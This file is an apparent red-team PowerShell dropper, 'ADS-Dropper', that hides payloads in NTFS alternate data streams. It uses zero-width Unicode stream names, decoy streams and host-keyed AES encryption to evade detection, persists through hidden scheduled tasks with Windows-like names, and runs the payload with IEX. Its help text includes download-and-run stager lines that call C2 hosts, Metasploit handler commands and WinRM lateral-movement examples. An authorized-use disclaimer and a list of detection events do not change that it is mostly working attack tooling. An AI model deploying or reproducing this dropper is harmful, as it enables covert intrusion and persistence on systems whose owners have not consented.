<#
.DESCRIPTION ADS-Dropper hides arbitrary payloads in NTFS Alternate Data Streams (ADS), executes them via native Windows binaries (VBScript/PowerShell), and persists through multiple methods (Scheduled Tasks, Registry, WMI, Volume Root ADS).
Supports any C2 framework (Realm Imix, Metasploit, Sliver) or custom commands.
Includes AES-256 encryption, randomization, and privilege adaptation.
.PARAMETER Payload [REQUIRED] The payload to deploy. Accepts: - String: PowerShell command or script - Array: File path to payload script (e.g., @('payload.ps1'))
Examples:
  "IEX (New-Object Net.WebClient).DownloadString('http://c2/stager.ps1')"
  @('C:\payloads\imix_stager.ps1')
  "Write-Output 'Beacon' | Out-File C:\beacon.log -Append"
.PARAMETER Targets Target hosts for deployment. Default: @('localhost')
- 'localhost' = Local deployment
- Remote IPs/hostnames = Lateral movement via WinRM (requires -Credential)

Examples:
  -Targets @('localhost')
  -Targets @('10.10.10.50', 'dc01.corp.local')
.PARAMETER Persist Persistence methods (comma-separated). Default: @('task')
Available methods:
  task     - Scheduled Task (requires admin, logon + periodic triggers)
  reg      - Registry Run key (works as user or admin)
  volroot  - Volume Root ADS (requires admin, novel technique)

Examples:
  -Persist @('task')
  -Persist @('task', 'reg')
  -Persist @('volroot')
.PARAMETER Randomize Enable randomization for evasion: - Random file/stream names (mimics legitimate Windows ADS) - Random loader names (app_log_*.vbs/ps1) - Random task names (GUIDs)
Breaks signature-based detection but makes cleanup harder.

Example:
  -Randomize
.PARAMETER Encrypt Enable AES-256 encryption of payload in ADS.
- Key derived from machine UUID + hostname (deterministic per-system)
- Automatically switches to PowerShell loader (VBScript can't decrypt)
- Payload stored as Base64-encoded ciphertext

Example:
  -Encrypt
.PARAMETER NoExec Stage artifacts (ADS, loader, persistence) WITHOUT executing.
Use for:
- Pre-staging during recon phase
- Testing deployment without triggering C2 callbacks
- Verifying artifacts before execution

Example:
  -NoExec
.PARAMETER Credential PSCredential for remote deployment (WinRM authentication).
Required when -Targets includes remote hosts.

Example:
  -Credential (Get-Credential)
.EXAMPLE # Basic local deployment (unencrypted, scheduled task) .\ADS-Dropper.ps1 -Payload "Write-Output 'Test' | Out-File C:\test.log"
Description:
Stores payload in C:\ProgramData\SystemCache.dat:syc_payload
Creates VBScript loader at C:\ProgramData\app_log_a.vbs
Registers scheduled task: \Microsoft\Windows\Customer Experience Improvement Program\UsbCeip
Executes immediately
.EXAMPLE # Encrypted deployment with randomization (RECOMMENDED FOR OPSEC) $payload = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/imix.ps1')" .\ADS-Dropper.ps1 -Payload $payload -Encrypt -Randomize
Description:
- AES-256 encrypts payload (key from UUID+hostname)
- Random file: C:\ProgramData\CacheSvc.log
- Random stream: :SmartScreen or :Zone.Identifier
- Random loader: app_log_kqmxyz.ps1 (PowerShell for decryption)
- Random task: \Microsoft\Windows\UX\a3f5b2c1
.EXAMPLE # Multi-method persistence (belt-and-suspenders) .\ADS-Dropper.ps1 -Payload $c2Stager -Persist @('task', 'reg') -Encrypt
Description:
Creates TWO persistence methods:
1. Scheduled task (SYSTEM-level, periodic execution)
2. Registry Run key (user-level, executes on logon)
Ensures survival even if one method is detected/removed
.EXAMPLE # Volume root ADS (novel technique, requires admin) .\ADS-Dropper.ps1 -Payload $beacon -Persist @('volroot') -Randomize
Description:
- Stores execution command in C:\:ads_1234 (volume root ADS)
- Creates task: \Microsoft\Windows\Maintenance\WinSAT_567
- Task executes: powershell -Command "Get-Content 'C:\:ads_1234' | IEX"
- Survives directory deletions (no parent file)
.EXAMPLE # Stage without execution (recon phase) .\ADS-Dropper.ps1 -Payload $payload -NoExec -Verbose
Description:
Creates all artifacts (ADS, loader, scheduled task) but does NOT execute.
Use -Verbose to see deployment details.
Manually trigger later via: wscript.exe //B C:\ProgramData\app_log_a.vbs
.EXAMPLE # Lateral movement to multiple hosts $cred = Get-Credential # Prompt for domain\user credentials $targets = @('10.10.10.50', '10.10.10.51', 'dc01.corp.local') .\ADS-Dropper.ps1 -Payload $msfStager -Targets $targets -Credential $cred -Encrypt -Randomize
Description:
- Deploys to 3 remote hosts via WinRM
- Serializes functions and executes remotely
- Each host gets unique random artifacts (if -Randomize)
.EXAMPLE # Realm C2 (Imix agent) deployment - CCDC scenario $imixStager = Get-Content .\imix_stager.txt -Raw # Base64 from Realm console .\ADS-Dropper.ps1 -Payload $imixStager -Persist @('task', 'reg') -Encrypt -Randomize -Verbose
Description:
Full stealth deployment:
- Encrypted Imix stager
- Randomized artifacts (evades signatures)
- Dual persistence (task + registry)
- Verbose output for verification
.EXAMPLE # Metasploit reverse shell # First, generate stager with msfvenom: # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f psh-cmd
$msfPayload = 'IEX (New-Object Net.WebClient).DownloadString("http://192.168.1.100/payload.ps1")'
.\ADS-Dropper.ps1 -Payload $msfPayload -Persist @('task') -Encrypt

Description:
Deploys Metasploit stager with encryption.
Start MSF handler: msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 192.168.1.100; set LPORT 443; exploit"
.EXAMPLE # Sliver implant deployment $sliverStager = @('C:\payloads\sliver_beacon.ps1') # Generated by Sliver .\ADS-Dropper.ps1 -Payload $sliverStager -Persist @('volroot') -Randomize -Encrypt
Description:
Deploys Sliver beacon from file with volume root persistence.
.EXAMPLE # Custom persistent command (non-C2) $customBeacon = @' while($true) { "$(Get-Date) - Beacon alive" | Out-File C:\beacon.log -Append Start-Sleep -Seconds 300 } '@ .\ADS-Dropper.ps1 -Payload $customBeacon -Persist @('reg')
Description:
Simple persistent beacon (writes to log every 5 minutes).
No C2 connection, useful for testing persistence without network traffic.
.NOTES File Name : ADS-Dropper.ps1 Author : Louis (https://github.com/yourusername) Prerequisite : PowerShell 5.1+, NTFS filesystem, Windows 10+ Version : 2.1
MITRE ATT&CK Mapping:
- T1564.004: Hide Artifacts - NTFS File Attributes
- T1053.005: Scheduled Task/Job
- T1547.001: Boot or Logon Autostart Execution - Registry Run Keys

Detection:
- Sysmon Event ID 15 (FileCreateStreamHash) - ADS creation
- Windows Event ID 4698 (Task Created)
- Windows Event ID 4657 (Registry modification)

Cleanup:
Run tests/cleanup.ps1 to remove all artifacts:
  .\tests\cleanup.ps1 -Targets @('localhost')
.LINK GitHub: https://github.com/Qweary/Appartition-Delivery-System Blog: https://qweary.github.io
Research Credits:
- Oddvar Moe: https://oddvar.moe (ADS execution techniques)
- Enigma0x3: https://enigma0x3.net (ADS persistence patterns)
- MITRE ATT&CK: https://attack.mitre.org/techniques/T1564/004/
.OUTPUTS Console output showing deployment progress: - Admin status - Target hosts - Persistence methods - ADS creation confirmation - Loader path - Success/failure status
For remote deployments, returns hashtable with:
- Success (bool)
- Artifacts (hashtable with ADS path, loader path)
- Error (string, if failed)
.COMPONENT Requires NTFS filesystem (ADS not supported on FAT32/exFAT) Requires PowerShell remoting (WinRM) for lateral movement
.ROLE Red Team / Penetration Testing
AUTHORIZED USE ONLY:
- Penetration testing with written permission
- CCDC and similar competitive exercises
- Security research in isolated labs

Unauthorized use is illegal and unethical.
.FUNCTIONALITY Persistence, Execution, Defense Evasion
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$Payload,
    
    [switch]$PayloadAtRuntime,
    [string[]]$Targets = @('localhost'),
    
    [ValidateSet('task', 'registry', 'wmi', 'none')]
    [string]$Persist = 'task',
    
    [switch]$Randomize,
    [switch]$Encrypt,
    [switch]$ZeroWidthStreams,
    
    [ValidateSet('single', 'multi', 'hybrid')]
    [string]$ZeroWidthMode = 'single',
    
    [string]$HybridPrefix,
    
    [ValidateRange(0, 10)]
    [int]$CreateDecoys = 0,
    
    [string]$ManifestPath,
    [switch]$NoExec,
    [PSCredential]$Credential,
    [switch]$Help,
    
    [switch]$GenerateOnly
)

# Help display function
function Show-Help {
    $helpText = @"
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•— â•‘ ADS-Dropper v2.1 - Quick Reference â•‘ â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
USAGE: .\ADS-Dropper.ps1 -Payload <string|file> [OPTIONS]
REQUIRED: -Payload <string|array> Payload to deploy (command or @('file.ps1'))
OPTIONAL: -Targets <array> Target hosts (default: @('localhost')) -Persist <array> Persistence methods: task, reg, volroot -Randomize Randomize artifacts for evasion -Encrypt AES-256 encrypt payload -NoExec Stage without executing -Credential <PSCredential> Creds for remote deployment
QUICK START EXAMPLES:
Local deployment (basic)
.\ADS-Dropper.ps1 -Payload "Write-Output 'Test'"
Full stealth (RECOMMENDED)
.\ADS-Dropper.ps1 -Payload `$c2Stager -Encrypt -Randomize
Multiple persistence methods
.\ADS-Dropper.ps1 -Payload `$payload -Persist @('task','reg')
Lateral movement
$cred = Get-Credential .\ADS-Dropper.ps1 -Payload payloadâˆ’Targets@(â€²dc01â€²)âˆ’Credentialâ€˜payload -Targets @('dc01') -Credential ` payloadâˆ’Targets@(â€²dc01â€²)âˆ’Credential
PERSISTENCE METHODS:
task Scheduled Task (admin required) â””â”€ Triggers: Logon + periodic (every 5 min) â””â”€ Path: \Microsoft\Windows\UX* or ...\UsbCeip
reg Registry Run Key (user or admin) â””â”€ HKCU/HKLM:...\CurrentVersion\Run â””â”€ Fallback if not admin
volroot Volume Root ADS (admin required, NOVEL) â””â”€ Stores command in C::ads_* â””â”€ No parent file, survives directory wipes
ENCRYPTION:
-Encrypt enables AES-256 with machine-specific key (UUID+hostname)
Pros: Prevents static analysis, evades content-based detection Cons: Requires PowerShell loader (more telemetry than VBScript)
RANDOMIZATION:
-Randomize generates unique artifacts per deployment:
File: SystemCache.dat -> CacheSvc.log Stream: :syc_payload -> :SmartScreen or :Zone.Identifier Loader: app_log_a.vbs -> app_log_kqmxyz.vbs Task: UsbCeip -> a3f5b2c1-... (GUID)
C2 FRAMEWORK EXAMPLES:
Realm C2 (Imix agent)
$imix = Get-Content .\imix_stager.txt -Raw .\ADS-Dropper.ps1 -Payload $imix -Encrypt -Randomize
Metasploit
$msf = 'IEX (New-Object Net.WebClient).DownloadString("http://c2/m.ps1")' .\ADS-Dropper.ps1 -Payload $msf -Persist @('task')
Sliver
$sliver = @('C:\payloads\sliver.ps1') .\ADS-Dropper.ps1 -Payload $sliver -Encrypt
DETECTION & CLEANUP:
Blue team detection: - Sysmon Event ID 15 (ADS creation) - Event ID 4698 (Task creation) - PowerShell: Get-ChildItem C:\ProgramData -Stream *
Cleanup artifacts: .\tests\cleanup.ps1 -Targets @('localhost')
TESTING:
Validation suite: .\tests\validate.ps1
Manual verification: dir /r C:\ProgramData # Show ADS schtasks /query /fo LIST # Show tasks Get-Item C::ads_* 2>$null # Check volume root
MORE INFO:
Full help: Get-Help .\ADS-Dropper.ps1 -Full Examples: Get-Help .\ADS-Dropper.ps1 -Examples Parameters: Get-Help .\ADS-Dropper.ps1 -Parameter *
GitHub: https://github.com/qweary/apparition-delivery-system Blog writeup: https://qweary.github.io
ETHICAL USE ONLY - AUTHORIZED TESTING WITH PERMISSION REQUIRED
"@
Write-Host $helpText -ForegroundColor Cyan
}

# Help flag intercept
if ($Help -or $args -contains '-h' -or $args -contains '--help' -or 
    $args -contains '-?' -or $args -contains '/?' -or 
    (!$PSBoundParameters.ContainsKey('Payload') -and $args.Count -eq 0)) {
    Show-Help
    exit 0
}

# Main Execution Logic Begins

#region Zero-Width Unicode Functions

# Verified zero-width Unicode codepoints
$script:ZeroWidthChars = @(
    0x061C,  # Arabic Letter Mark
    0x180E,  # Mongolian Vowel Separator
    0x200B,  # Zero Width Space
    0x200C,  # Zero Width Non-Joiner
    0x200D,  # Zero Width Joiner
    0x200E,  # Left-to-Right Mark
    0x200F,  # Right-to-Left Mark
    0x202A,  # LTR Embedding
    0x202B,  # RTL Embedding
    0x202C,  # Pop Directional
    0x202D,  # LTR Override
    0x202E,  # RTL Override
    0x2060,  # Word Joiner
    0xFEFF   # Zero Width No-Break Space
)

function Generate-ZeroWidthStream {
    <#
    .SYNOPSIS
        Generates zero-width Unicode stream name
    #>
    [CmdletBinding()]
    [OutputType([string])]
    param(
        [ValidateSet('single', 'multi', 'hybrid')]
        [string]$Mode = 'single',

        [string]$Prefix,

        [ValidateRange(2, 5)]
        [int]$Length = 3
    )

    try {
        switch ($Mode) {
            'single' {
                $char = [char]($script:ZeroWidthChars | Get-Random)
                return $char
            }
            
            'multi' {
                $chars = @()
                for ($i = 0; $i -lt $Length; $i++) {
                    $chars += [char]($script:ZeroWidthChars | Get-Random)
                }
                return -join $chars
            }
            
            'hybrid' {
                # Legitimate stream names
                $legitNames = @('Zone.Identifier', 'Summary', 'Comments', 'Author')
                
                if ([string]::IsNullOrEmpty($Prefix)) {
                    $Prefix = $legitNames | Get-Random
                }
                
                $suffix = [char]($script:ZeroWidthChars | Get-Random)
                return "$Prefix$suffix"
            }
        }
    } catch {
        Write-Verbose "Zero-width generation failed, using fallback"
        return -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
    }
}

function Get-ZeroWidthCodepoints {
    <#
    .SYNOPSIS
        Returns Unicode codepoints for a stream name
    #>
    [CmdletBinding()]
    param([string]$StreamName)

    $chars = $StreamName.ToCharArray()
    $codepoints = ($chars | ForEach-Object { "U+{0:X4}" -f [int]$_ }) -join ' '
    $bytes = ([System.Text.Encoding]::Unicode.GetBytes($StreamName) | 
              ForEach-Object { "0x{0:X2}" -f $_ }) -join ' '

    return [PSCustomObject]@{
        StreamName = $StreamName
        Codepoints = $codepoints
        ByteSequence = $bytes
        CharCount = $chars.Length
        ContainsZeroWidth = ($chars | Where-Object { 
            $script:ZeroWidthChars -contains [int]$_ 
        }).Count -gt 0
    }
}

function ConvertFrom-Codepoints {
    <#
    .SYNOPSIS
        Reconstructs stream name from codepoint string
    #>
    [CmdletBinding()]
    param([string]$Codepoints)

    try {
        $points = $Codepoints -split '\s+' | ForEach-Object {
            $cleaned = $_ -replace '^(U\+|0x)', ''
            [int]"0x$cleaned"
        }
        return -join ($points | ForEach-Object { [char]$_ })
    } catch {
        Write-Error "Failed to reconstruct from codepoints: $_"
        return $null
    }
}

#endregion

#region Manifest Functions (Linux-side only)

function Create-ManifestEntry {
    <#
    .SYNOPSIS
        Creates manifest entry for tracking (Linux operator machine)
    #>
    [CmdletBinding()]
    param(
        [string]$TargetHost,
        [string]$FilePath,
        [string]$StreamName,
        [string]$PayloadHash,
        [string]$PersistenceMethod
    )

    $info = Get-ZeroWidthCodepoints -StreamName $StreamName

    return [PSCustomObject]@{
        EntryId = [guid]::NewGuid().ToString()
        Timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss UTC")
        TargetHost = $TargetHost
        FilePath = $FilePath
        StreamName = $StreamName
        Codepoints = $info.Codepoints
        PayloadHash = $PayloadHash
        PersistenceMethod = $PersistenceMethod
        OperatorUsername = $env:USER
        OperatorHostname = hostname
    }
}

function Save-ManifestToLinux {
    <#
    .SYNOPSIS
        Saves manifest to Linux operator machine (NOT Windows target)
    #>
    [CmdletBinding()]
    param(
        [PSCustomObject[]]$Entries,
        [string]$OutputPath
    )

    try {
        $json = $Entries | ConvertTo-Json -Depth 10
        
        if (-not (Test-Path (Split-Path $OutputPath))) {
            New-Item -Path (Split-Path $OutputPath) -ItemType Directory -Force | Out-Null
        }

        $json | Out-File -FilePath $OutputPath -Encoding UTF8
        Write-Verbose "Manifest saved to: $OutputPath"
    } catch {
        Write-Error "Failed to save manifest: $_"
    }
}

#endregion

#region Payload Encryption

function Get-HostDerivedKey {
    <#
    .SYNOPSIS
        Derives AES-256 key from target host properties
    #>
    try {
        $hostInfo = @(
            $env:COMPUTERNAME
            (Get-WmiObject Win32_ComputerSystemProduct -ErrorAction SilentlyContinue).UUID
            (Get-WmiObject Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber
        ) -join '|'

        $sha256 = [System.Security.Cryptography.SHA256]::Create()
        return $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hostInfo))
    } catch {
        Write-Warning "Host key derivation failed, using fallback"
        return [System.Text.Encoding]::UTF8.GetBytes('ADS-Fallback-Key-32-Bytes-Long!')
    }
}

function Protect-Payload {
    <#
    .SYNOPSIS
        Encrypts payload with AES-256
    #>
    param([string]$PlainText, [byte[]]$Key)

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $Key
    $aes.GenerateIV()

    $encryptor = $aes.CreateEncryptor()
    $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
    $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)

    $result = $aes.IV + $encryptedBytes
    return [Convert]::ToBase64String($result)
}

function Unprotect-Payload {
    <#
    .SYNOPSIS
        Decrypts payload with AES-256
    #>
    param([string]$EncryptedData, [byte[]]$Key)

    $encryptedBytes = [Convert]::FromBase64String($EncryptedData)

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $Key
    
    $iv = $encryptedBytes[0..15]
    $ciphertext = $encryptedBytes[16..($encryptedBytes.Length - 1)]
    
    $aes.IV = $iv
    $decryptor = $aes.CreateDecryptor()
    
    $plainBytes = $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
    return [System.Text.Encoding]::UTF8.GetString($plainBytes)
}

#endregion

#region ADS Operations

function Get-RandomADSConfig {
    <#
    .SYNOPSIS
        Generates ADS configuration
    #>
    [CmdletBinding()]
    param(
        [switch]$UseZeroWidth,
        [string]$ZwMode = 'single',
        [string]$ZwPrefix
    )

    # Cross-platform path handling
    # On Linux (config generation): use Windows default path
    # On Windows (actual deployment): use actual %ProgramData%
    if ($env:ProgramData) {
        # Running on Windows - use Join-Path normally
        $hostPath = if ($Randomize) {
            Join-Path $env:ProgramData (-join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ }))
        } else {
            Join-Path $env:ProgramData "SystemCache.dat"
        }
    } else {
        # Running on Linux - manually construct Windows path (Join-Path won't work with C:\)
        if ($Randomize) {
            $randomName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
            $hostPath = "C:\ProgramData\$randomName"
        } else {
            $hostPath = "C:\ProgramData\SystemCache.dat"
        }
    }
   
    $streamName = if ($UseZeroWidth) {
        Generate-ZeroWidthStream -Mode $ZwMode -Prefix $ZwPrefix
    } else {
        if ($Randomize) {
            -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
        } else {
            'payload'
        }
    }

    return @{
        HostPath = $hostPath
        StreamName = $streamName
        Codepoints = (Get-ZeroWidthCodepoints -StreamName $streamName).Codepoints
    }
}

function Create-DecoyStreams {
    <#
    .SYNOPSIS
        Creates benign decoy ADS
    #>
    [CmdletBinding()]
    param([string]$HostPath, [int]$Count = 3)

    if ($Count -le 0) { return }

    $decoyNames = @(':Zone.Identifier', ':Summary', ':Comments', ':Author')
    $benignContent = @(
        "[ZoneTransfer]`r`nZoneId=3",
        "Document summary information",
        "Internal use only"
    )

    for ($i = 0; $i -lt [Math]::Min($Count, $decoyNames.Count); $i++) {
        $content = $benignContent | Get-Random
        try {
            $content | Set-Content -Path "$HostPath$($decoyNames[$i])" -Force
            Write-Verbose "Created decoy: $($decoyNames[$i])"
        } catch {
            Write-Warning "Failed to create decoy $($decoyNames[$i]): $_"
        }
    }
}

function Write-ADSPayload {
    <#
    .SYNOPSIS
        Writes payload to ADS
    #>
    [CmdletBinding()]
    param(
        [string]$HostPath,
        [string]$StreamName,
        [string]$PayloadContent,
        [switch]$EncryptPayload
    )

    try {
        # Ensure host file exists
        if (-not (Test-Path $HostPath)) {
            New-Item -Path $HostPath -ItemType File -Force | Out-Null
        }

        # Encrypt if requested
        $finalPayload = if ($EncryptPayload) {
            $key = Get-HostDerivedKey
            Protect-Payload -PlainText $PayloadContent -Key $key
        } else {
            $PayloadContent
        }

        # Write to ADS
        $adsPath = "$HostPath`:$StreamName"
        $finalPayload | Set-Content -Path $adsPath -Force
        
        Write-Verbose "Payload written to: $adsPath"
        return $adsPath
    } catch {
        Write-Error "Failed to write ADS: $_"
        return $null
    }
}

#endregion

#region Persistence

function Build-Loader {
    <#
    .SYNOPSIS
        Generates PowerShell loader for ADS
    #>
    param(
        [string]$HostPath,
        [string]$StreamName,
        [switch]$IsEncrypted
    )

    if ($IsEncrypted) {
        return @"
`$k = Get-HostDerivedKey
`$e = Get-Content '$HostPath`:$StreamName' -Raw
`$p = Unprotect-Payload -EncryptedData `$e -Key `$k
IEX `$p
"@
    } else {
        return @"
`$p = Get-Content '$HostPath`:$StreamName' -Raw
IEX `$p
"@
    }
}

function Create-ScheduledTaskPersistence {
    <#
    .SYNOPSIS
        Creates scheduled task for persistence
    #>
    [CmdletBinding()]
    param(
        [string]$LoaderScript,
        [string]$TaskName
    )

    try {
        if ([string]::IsNullOrEmpty($TaskName)) {
            $TaskName = if ($Randomize) {
                "WinSAT_" + (-join ((65..90) | Get-Random -Count 6 | ForEach-Object { [char]$_ }))
            } else {
                "SystemOptimization"
            }
        }

        # Save loader to temp
        $loaderPath = "$env:TEMP\$([guid]::NewGuid().ToString().Substring(0,8)).ps1"
        $LoaderScript | Out-File -FilePath $loaderPath -Encoding UTF8

        $action = New-ScheduledTaskAction -Execute "powershell.exe" `
            -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$loaderPath`""
        
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
        
        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
        
        Write-Verbose "Scheduled task created: $TaskName"
        return $TaskName
    } catch {
        Write-Error "Task creation failed: $_"
        return $null
    }
}

#endregion

#region Main Execution

# Handle payload input
if ($PayloadAtRuntime -and -not $Payload) {
    Write-Host "Enter payload (press Enter twice when done):" -ForegroundColor Cyan
    $lines = @()
    do {
        $line = Read-Host
        if ($line) { $lines += $line }
    } while ($line)
    $Payload = $lines -join "`n"
}

if (-not $Payload) {
    Write-Error "No payload specified. Use -Payload or -PayloadAtRuntime"
    exit 1
}

# Generate config
$config = Get-RandomADSConfig -UseZeroWidth:$ZeroWidthStreams `
                              -ZwMode $ZeroWidthMode `
                              -ZwPrefix $HybridPrefix

Write-Verbose "Host: $($config.HostPath)"
Write-Verbose "Stream: $($config.StreamName)"
if ($ZeroWidthStreams) {
    Write-Warning "Zero-width stream - Codepoints: $($config.Codepoints)"
}

# Generate task name (for both GenerateOnly and normal execution)
$taskName = if ($Randomize) {
    "WinSAT_" + (-join ((65..90) | Get-Random -Count 6 | ForEach-Object { [char]$_ }))
} else {
    "SystemOptimization"
}

# If GenerateOnly mode, return configuration and exit
if ($GenerateOnly) {
    # Convert stream name to escaped format for command generation
    $streamChars = $config.StreamName.ToCharArray()
    $streamNameEscaped = ($streamChars | ForEach-Object {
        "[char]0x{0:X4}" -f [int]$_
    }) -join '+'
    
    # Return configuration object
    return [PSCustomObject]@{
        HostPath = $config.HostPath
        StreamName = $config.StreamName
        StreamNameEscaped = $streamNameEscaped
        Codepoints = $config.Codepoints
        TaskName = $taskName
        Payload = $Payload
        PayloadEncrypted = $Encrypt.IsPresent
        PersistenceMethod = $Persist
        DecoysCount = $CreateDecoys
        ZeroWidthMode = $ZeroWidthMode
        HybridPrefix = $HybridPrefix
        Randomized = $Randomize.IsPresent
    }
}

# Normal execution path (not GenerateOnly)
# Create decoys
if ($CreateDecoys -gt 0) {
    Create-DecoyStreams -HostPath $config.HostPath -Count $CreateDecoys
}

# Write payload
$adsPath = Write-ADSPayload -HostPath $config.HostPath `
                            -StreamName $config.StreamName `
                            -PayloadContent $Payload `
                            -EncryptPayload:$Encrypt

if (-not $adsPath) {
    Write-Error "Failed to create ADS"
    exit 1
}

# Create persistence
if ($Persist -ne 'none') {
    $loader = Build-Loader -HostPath $config.HostPath `
                          -StreamName $config.StreamName `
                          -IsEncrypted:$Encrypt

    switch ($Persist) {
        'task' {
            $taskName = Create-ScheduledTaskPersistence -LoaderScript $loader -TaskName $taskName
            Write-Host "[+] Persistence: Scheduled Task '$taskName'" -ForegroundColor Green
        }
        'registry' {
            Write-Warning "Registry persistence not implemented in this version"
        }
        'wmi' {
            Write-Warning "WMI persistence not implemented in this version"
        }
    }
}

# Save manifest (Linux only - not on Windows target)
if ($ManifestPath) {
    $payloadHash = (Get-FileHash -InputStream ([System.IO.MemoryStream]::new([System.Text.Encoding]::UTF8.GetBytes($Payload))) -Algorithm SHA256).Hash
    
    $entry = Create-ManifestEntry -TargetHost $env:COMPUTERNAME `
                                  -FilePath $config.HostPath `
                                  -StreamName $config.StreamName `
                                  -PayloadHash $payloadHash `
                                  -PersistenceMethod $Persist

    Save-ManifestToLinux -Entries @($entry) -OutputPath $ManifestPath
    Write-Host "[+] Manifest saved: $ManifestPath" -ForegroundColor Green
}

# Execute
if (-not $NoExec) {
    Write-Verbose "Executing payload..."
    try {
        IEX $Payload
    } catch {
        Write-Error "Execution failed: $_"
    }
}

Write-Host "[+] Deployment complete" -ForegroundColor Green

#endregion
